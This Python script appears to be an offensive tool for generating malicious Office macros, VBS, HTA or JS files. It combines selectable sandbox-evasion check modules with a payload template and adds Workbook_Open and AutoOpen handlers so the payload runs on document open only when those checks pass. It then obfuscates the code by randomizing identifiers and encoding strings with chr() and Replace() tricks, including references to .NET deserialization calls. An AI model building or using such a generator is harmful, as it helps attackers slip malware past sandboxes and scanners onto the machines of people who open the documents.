import os
import sys
import string
import random
import optparse

def string_generator(size=0, chars=string.ascii_lowercase):
    if size == 0:
        size = random.randint(4,10)
    return ''.join(random.choice(chars) for _ in range(size))

checks = {}
templates = []

def init_modules(macrotype):
    templates = os.listdir("./modules/%s/"%(macrotype))
    print("Checks Available:")
    for count, item in enumerate(templates):
        print("\t%s : %s"%(count,item))
        checks[str(count)] = item

def obfuscateStringChr(instring):
    outstring = []
    tempstring = ""
    skipval = 0
    for count, char in enumerate(instring):
        #print(char)
        #print("%d out of %d"%(count, len(instring)))
        if skipval != 0:
            skipval -= 1
            tempstring += char
            if skipval == 0 or count == len(instring)-1:
                tempstring += "\""
                #print(tempstring)
                outstring.append(tempstring)
                tempstring = ""
            continue
        randval = random.randint(0, 8)
        if randval > 3 or randval == 0 or count == len(instring)-1:
            #print("chr(%d)"%(ord(char)))
            outstring.append("chr(%d)"%(ord(char)))
        else:
            tempstring = "\""+ char
            skipval = randval

    return " & ".join(outstring)



def obfuscate(inputdata, functionnames, stringobfuscation):
    variables = set()
    stringlist = []
    firststringlist = []
    inputdataCleaned = ""
    for line in inputdata.split("\n"):
        clean = line.lstrip()
        if clean.startswith("'"):
            #ignore
            print("Skipping line")
            continue
        elif "=" in clean:
            variable = clean.split("=")[0].lstrip().rstrip()
            if "Set " in variable:
                variable = variable.replace("Set ", "")
            if " " not in variable and "." not in variable:
                variables.add(variable)
        if "\"" in line:
            quotecount = line.count("\"")
            strings = line.split("\"")
            for count in range(quotecount/2):
                print(strings[count*2+1])
                #Only do the serialized_obj obfuscation with method 1
                if stringobfuscation == 1:
                    stringlist.append(strings[count*2+1])
                elif stringobfuscation == 2:
                    if "serialized_obj" in line:
                        print("Skipping line")
                    #elif "RunClass" in line or "DynamicInvoke" in line or "SurrogateSelector" in line or "Deserialize_2" in line:
                    #    firststringlist.append(strings[count*2+1])
                    else:
                        stringlist.append(strings[count*2+1])
        inputdataCleaned = inputdataCleaned + line+"\n"

    orderedVars = sorted(variables, key=len)
    orderedFuncs = sorted(functionnames, key=len)
    #print("Variables:")
    #for item in variables:
    #    print("\t%s"%(item))
    mappings = {}
    used = []
    print("Ordered:")
    for item in orderedVars[::-1]:
        substitutestring = None
        while substitutestring is None:
            substitutestring = string_generator()
            if substitutestring in used:
                substitutestring = None
        mappings[item] = substitutestring
        used.append(substitutestring)
        print("\t%s"%(item))
    print("Functions:")
    for item in orderedFuncs[::-1]:
        if item not in mappings.keys():
            substitutestring = None
            while substitutestring is None:
                substitutestring = string_generator()
                if substitutestring in used:
                    substitutestring = None
            mappings[item] = substitutestring
            used.append(substitutestring)
            print("\t%s"%(item))
        
    results = inputdataCleaned
    for item in mappings.keys():
        results = results.replace(item, mappings[item])
    for tempstring in stringlist:
        replacementstring = ""
        if stringobfuscation == 1:
            for item in tempstring:
                if random.randint(0, 1) == 0:
                    replacementstring = replacementstring+item
                else:
                    replacementstring = replacementstring +item+"|"
            results = results.replace("\"%s\""%(tempstring), "Replace(\"%s\", \"|\", \"\")"%(replacementstring))
        elif stringobfuscation == 2:
            temptempstring = tempstring
            if "RunClass" in tempstring or "DynamicInvoke" in tempstring or "SurrogateSelector" in tempstring or "Deserialize_2" in tempstring:
                for tempkey in mappings.keys():
                    temptempstring = temptempstring.replace(tempkey, mappings[tempkey])
            replacementstring = obfuscateStringChr(temptempstring)
            results = results.replace("\"%s\""%(temptempstring), replacementstring)

    return results
 

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-c", "--choices", dest="choices", help="Choices (ex. 0,2,3,4)", default=None)
    parser.add_option("-o", "--output", dest="output", help="Output", default="./output.vba")
    parser.add_option("-f", "--infile", dest="infile", help="Template input file.", default=None)
    parser.add_option("-t", "--type", dest="macrotype", help="Type of script vba, vbs, hta, or js", default="vba")
    parser.add_option("-s", "--stringtypes", dest="stringtypes", help="String obfuscation types. 1 - replace method, 2 - chr method", default="1")
    parser.add_option("-l", action="store_true", dest="listmods", help="List sandbox checks available.")
    (options, args) = parser.parse_args()
    
    init_modules(options.macrotype)
    stringobfuscation = int(options.stringtypes)
    if options.listmods:
        sys.exit()
    if options.choices != None:
        choices = options.choices
    else:
        choices = raw_input("What checks do you want to use (ex 0,2,3,4)")
    filterchoices = choices.split(",")
    datastuff = ""
    if options.infile != None:
        fin = open(options.infile, "r")
        datastuff = fin.read()
        fin.close()
    functionnames = []
    for item in filterchoices:
        if item in checks:
            fin = open("./modules/%s/%s"%(options.macrotype, checks[item]), "r")
            readin = fin.read()
            fin.close()
            datastuff +=readin
            functionnames.append(checks[item].replace(".%s"%(options.macrotype), "").replace(".txt", ""))
    if options.macrotype == "vba":
        datastuff = datastuff + "\nSub Workbook_Open()\n\tOn Error Resume Next\n\tIf "
        datastuff = datastuff + " And ".join(functionnames) + " Then\n\t\tRun\n\tEnd If\nEnd Sub\n"
 
        datastuff = datastuff + "\nSub AutoOpen()\n\tOn Error Resume Next\n\tIf "
        datastuff = datastuff + " And ".join(functionnames) + " Then\n\t\tRun\n\tEnd If\nEnd Sub\n"
        datastuff = datastuff + "\nSub Auto_Open()\n\tAutoOpen\nEndSub\n"
        if "DebugPrint" in datastuff:
            functionnames.append("DebugPrint")
        if "SetVersion" in datastuff:
            functionnames.append("SetVersion")
 
    print(datastuff)
    output = obfuscate(datastuff, functionnames, stringobfuscation)
    fout = open(options.output, "w")
    fout.write(output)
    fout.close()
    
